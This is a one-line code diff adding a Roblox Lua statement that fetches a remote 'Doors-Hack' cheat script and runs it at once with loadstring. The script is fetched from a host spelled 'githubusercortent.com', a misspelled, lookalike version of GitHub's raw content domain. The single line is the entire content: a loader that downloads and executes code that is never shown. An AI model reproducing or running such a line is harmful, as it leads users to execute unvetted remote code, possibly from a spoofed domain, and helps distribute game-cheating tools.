@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/MrNeRD0/Doors-Hack/main/MagnetByNerd.lua"))()
